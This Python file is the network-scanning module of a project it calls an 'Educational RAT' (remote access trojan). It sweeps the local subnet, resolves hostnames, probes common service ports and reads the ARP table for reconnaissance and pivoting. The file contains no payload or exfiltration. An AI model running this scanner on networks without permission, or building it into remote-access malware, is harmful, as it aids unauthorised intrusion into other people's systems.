#!/usr/bin/env python3
"""
Network scanner module for Educational RAT
Demonstrates network reconnaissance / pivot techniques
"""

import socket
import subprocess
import platform
import threading
import ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed


def get_local_network():
    """Detect local network range"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        local_ip = s.getsockname()[0]
        s.close()
        parts = local_ip.split('.')
        return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24", local_ip
    except:
        return "192.168.1.0/24", "192.168.1.1"


def ping_host(ip):
    """Ping a single host"""
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    timeout_param = '-w' if platform.system().lower() == 'windows' else '-W'
    timeout_val = '500' if platform.system().lower() == 'windows' else '1'
    cmd = ['ping', param, '1', timeout_param, timeout_val, str(ip)]
    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=3)
        return result.returncode == 0
    except:
        return False


def scan_port(ip, port, timeout=1):
    """Scan a single port on a host"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((str(ip), port))
        s.close()
        return result == 0
    except:
        return False


def get_service_name(port):
    """Get common service name for a port"""
    services = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
        53: "DNS", 80: "HTTP", 110: "POP3", 135: "RPC",
        139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB",
        993: "IMAPS", 995: "POP3S", 1433: "MSSQL", 1521: "Oracle",
        3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
        6379: "Redis", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt",
        27017: "MongoDB"
    }
    return services.get(port, "Unknown")


def scan_network(network_range=None, callback=None):
    """
    Scan network for alive hosts
    Returns list of (ip, hostname) tuples
    """
    if network_range is None:
        network_range, _ = get_local_network()

    alive_hosts = []
    try:
        network = ipaddress.ip_network(network_range, strict=False)
    except ValueError:
        return []

    def check_host(ip):
        if ping_host(ip):
            try:
                hostname = socket.gethostbyaddr(str(ip))[0]
            except:
                hostname = "Unknown"
            return (str(ip), hostname)
        return None

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(check_host, ip): ip for ip in network.hosts()}
        for future in as_completed(futures):
            result = future.result()
            if result:
                alive_hosts.append(result)
                if callback:
                    callback(f"Found: {result[0]} ({result[1]})")

    return sorted(alive_hosts, key=lambda x: ipaddress.ip_address(x[0]))


def scan_ports(target_ip, ports=None, callback=None):
    """
    Scan common ports on a target
    Returns list of (port, service, open) tuples
    """
    if ports is None:
        ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445,
                 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379,
                 8080, 8443, 27017]

    results = []

    def check_port(port):
        is_open = scan_port(target_ip, port)
        service = get_service_name(port)
        return (port, service, is_open)

    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = {executor.submit(check_port, p): p for p in ports}
        for future in as_completed(futures):
            result = future.result()
            results.append(result)
            if result[2] and callback:
                callback(f"  Port {result[0]}/{result[1]}: OPEN")

    return sorted(results, key=lambda x: x[0])


def get_arp_table():
    """Get ARP table entries"""
    try:
        if platform.system() == "Windows":
            result = subprocess.run("arp -a", shell=True, capture_output=True, text=True, timeout=5)
        else:
            result = subprocess.run("arp -n", shell=True, capture_output=True, text=True, timeout=5)
        return result.stdout
    except:
        return "ARP table unavailable"


def full_scan_report(network_range=None):
    """Generate a full network scan report"""
    if network_range is None:
        network_range, local_ip = get_local_network()
    else:
        _, local_ip = get_local_network()

    report = []
    report.append(f"Network Scan Report")
    report.append(f"{'=' * 60}")
    report.append(f"Scanner IP: {local_ip}")
    report.append(f"Network Range: {network_range}")
    report.append(f"")

    report.append(f"[*] Scanning for alive hosts...")
    hosts = scan_network(network_range)
    report.append(f"[+] Found {len(hosts)} hosts alive")
    report.append(f"")

    for ip, hostname in hosts:
        report.append(f"Host: {ip} ({hostname})")
        open_ports = [(p, s) for p, s, o in scan_ports(ip) if o]
        if open_ports:
            for port, service in open_ports:
                report.append(f"  Port {port}/{service}: OPEN")
        else:
            report.append(f"  No common ports open")
        report.append(f"")

    report.append(f"{'=' * 60}")
    report.append(f"Scan complete. {len(hosts)} hosts found.")

    return "\n".join(report)
